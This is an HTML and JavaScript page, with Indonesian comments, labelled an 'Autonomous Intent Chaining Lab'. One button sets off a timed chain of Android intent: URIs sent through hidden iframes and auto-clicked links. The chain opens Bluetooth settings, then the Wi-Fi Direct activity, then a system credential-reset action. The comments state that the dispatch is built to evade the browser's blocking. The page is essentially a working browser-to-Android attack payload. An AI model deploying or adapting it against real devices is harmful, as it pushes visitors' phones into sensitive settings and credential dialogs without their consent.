<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Autonomous Intent Chaining Lab</title>
<style>
    body{font-family:monospace; padding:20px; background:#0a0a0a; color:#00ff66;}
    button{width:100%; padding:16px; margin-top:15px; background:#141414; color:#00ff66; border:1px solid #00ff66; font-weight:bold; cursor:pointer;}
    button:hover{background:#00ff66; color:#000;}
    .status-panel{border:1px solid #00ff66; padding:15px; margin-bottom:15px; background:#111;}
    #console-log{margin-top:20px; border:1px solid #00ff66; padding:12px; height:350px; overflow:auto; white-space:pre-wrap; background:#000; font-size:12px;}
</style>
</head>
<body>

<h2>Autonomous Intent Chaining Lab</h2>

<div class="status-panel">
    <p>Status: <span id="harness-state">READY</span></p>
    <!-- Tombol pemicu utama untuk memulai seluruh rantai secara otomatis -->
    <button id="start-autonomous-chain">LAUNCH AUTONOMOUS FULL CHAIN</button>
</div>

<div id="console-log"></div>

<script>
const consoleLog = document.getElementById("console-log");
const stateLabel = document.getElementById("harness-state");

function writeLog(text) {
    const timestamp = new Date().toLocaleTimeString();
    consoleLog.textContent += `[${timestamp}] ${text}\n`;
    consoleLog.scrollTop = consoleLog.scrollHeight;
}

// Mengonstruksi URI Intent dengan flag mitigasi bypass dan ekstra parameter
function generateIntentUri(action, component = '', extras = {}) {
    let uri = `intent:#Intent;action=${action};`;
    
    if (component) {
        uri += `component=${component};`;
    }
    
    // Menyisipkan parameter tambahan (Extras) untuk memicu logika internal komponen target
    Object.keys(extras).forEach(key => {
        uri += `S.${key}=${encodeURIComponent(extras[key])};`;
    });
    
    // FLAG_ACTIVITY_NEW_TASK (0x10000000)
    // FLAG_ACTIVITY_CLEAR_TOP (0x04000000) - Memaksa komponen memuat ulang statusnya
    // FLAG_ACTIVITY_NO_ANIMATION (0X00010000) - Mempercepat transisi eksekusi
    uri += "launchFlags=0x14010000;category=android.intent.category.DEFAULT;end";
    return uri;
}

// Eksekutor berbasis DOM dinamis untuk meminimalkan deteksi pemblokiran peramban
function dispatchUri(uri) {
    writeLog(`Dispatched: ${uri.substring(0, 60)}...`);
    try {
        const frame = document.createElement("iframe");
        frame.src = uri;
        frame.style.display = "none";
        document.body.appendChild(frame);
        
        // Cadangan eksekusi menggunakan elemen jangkar jika iframe diisolasi
        const anchor = document.createElement("a");
        anchor.href = uri;
        anchor.rel = "noopener noreferrer";
        anchor.click();

        setTimeout(() => {
            frame.remove();
        }, 300);
    } catch (e) {
        writeLog(`Execution Error: ${e.message}`);
    }
}

// Pemicu Otomatis Berantai (Autonomous Chaining Mechanism)
document.getElementById("start-autonomous-chain").addEventListener("click", () => {
    stateLabel.textContent = "EXECUTING CHAIN...";
    writeLog("=== MEMULAI RANTAI OTONOM ===");

    // LANGKAH 1: Paksa aktivasi state Bluetooth / Visibility Mode
    const intent1 = generateIntentUri("android.settings.BLUETOOTH_SETTINGS");
    dispatchUri(intent1);

    // LANGKAH 2: Otomatisasi transisi setelah jendela kehilangan fokus (User leaves page)
    // Menggunakan jeda waktu makro untuk memastikan sub-sistem Android memproses status awal
    setTimeout(() => {
        writeLog("Rantai 2: Mengalihkan ke Pengaturan Jaringan Nirkabel tingkat lanjut...");
        const intent2 = generateIntentUri(
            "android.intent.action.MAIN",
            "com.android.settings/.Settings$WifiP2pSettingsActivity" // Mengincar aktivitas Wi-Fi Direct
        );
        dispatchUri(intent2);
    }, 1200);

    // LANGKAH 3: Membuka installer internal atau pengelola kredensial jika tersedia
    setTimeout(() => {
        writeLog("Rantai 3: Memicu dialog peninjau kredensial sistem...");
        const intent3 = generateIntentUri(
            "android.credentials.RESET_CREDENTIALS",
            "",
            { "com.android.settings.extra.SUB_SETTINGS": "true" }
        );
        dispatchUri(intent3);
        stateLabel.textContent = "CHAIN COMPLETED";
    }, 2400);
});

// Memantau perubahan visibilitas halaman untuk memverifikasi apakah transisi intent berhasil keluar dari browser
document.addEventListener("visibilitychange", () => {
    writeLog(`Browser Visibility State: ${document.visibilityState}`);
});

writeLog("Harness laboratorium otonom berhasil diinisialisasi.");
</script>
</body>
</html>
